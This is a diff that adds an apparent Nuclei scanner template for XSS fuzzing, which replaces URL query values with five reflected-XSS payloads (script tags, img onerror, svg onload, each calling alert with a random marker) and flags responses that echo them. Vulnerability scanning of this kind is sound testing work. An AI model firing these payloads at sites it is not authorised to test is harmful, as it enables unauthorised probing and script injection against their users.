@@ -1,0 +1,45 @@
+id: practical-xss-fuzzing
+
+info:
+  name: Practical XSS Fuzzing (Optimized)
+  author: NeoPrime
+  severity: medium
+  description: Balanced XSS fuzzing with high-quality payloads
+  tags: xss,fuzzing,injection
+  metadata:
+    max-request: 50
+
+variables:
+  marker: "{{rand_text_alphanumeric(6)}}"
+
+http:
+  - payloads:
+      xss:
+        - "<script>alert('{{marker}}')</script>"
+        - "<img src=x onerror=alert('{{marker}}')>"
+        - "<svg/onload=alert('{{marker}}')>"
+        - "'\"><svg/onload=alert('{{marker}}')>"
+        - "\"><img src=x onerror=alert('{{marker}}')>"
+    
+    fuzzing:
+      - part: query
+        type: replace
+        mode: multiple
+        fuzz:
+          - "{{xss}}"
+    
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{marker}}"
+        condition: and
+      
+      - type: word
+        part: body
+        words:
+          - "<script>alert"
+          - "onerror=alert"
+          - "onload=alert"
+        condition: or
